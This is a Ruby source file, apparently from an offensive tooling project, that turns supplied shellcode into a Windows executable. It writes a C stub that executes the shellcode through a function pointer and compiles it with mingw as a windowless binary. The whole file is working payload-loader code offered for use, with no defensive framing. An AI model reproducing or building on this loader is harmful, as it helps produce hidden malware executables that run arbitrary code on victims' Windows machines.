module Plerus
  class Evo < Compiler
    def initialize
      super({
        title: "Mingw32-gcc Compiler",
      })
    end

    def compile(shellcode,output_path)
      # Create a random name
      name = random_name
      name = "#{output_path}/#{name}"

      # Create a .c file
      puts "Creating c code #{name}.c"
      c = create_c(shellcode)
      File.open("#{name}.c",'w') {|file| file.write(c) }
      # Compile the .c file
      puts "Compileing C code using i686-w64-mingw32-gcc compiler #{name}.exe"
      raise "Compile Error" unless system ("i686-w64-mingw32-gcc -Wl,-subsystem,windows -o #{name}.exe #{name}.c")
      # Return a compelted log entry
      log = shellcode.log
      log << [self.title,name]
    end


    def create_c(shellcode)
    # Simple C code that defines buffer with shellcode, creates a function pointer, points the function pointer at the shellcode, and then executes the function.
    c = %Q{
      // Basic Shellcode Execution via Function Pointer in C
      unsigned char buf[] = "#{shellcode.to_s}";

      int main(int argc, char *argv[])
      {
        int (*funct)();

        funct = (int(*)())buf;
        (int)(*funct)();
        return 0;
      }
    }
    # Removes leading spaces (to keep things looking nice)
    c = c.gsub(/^      /,'')
    end

  end
end
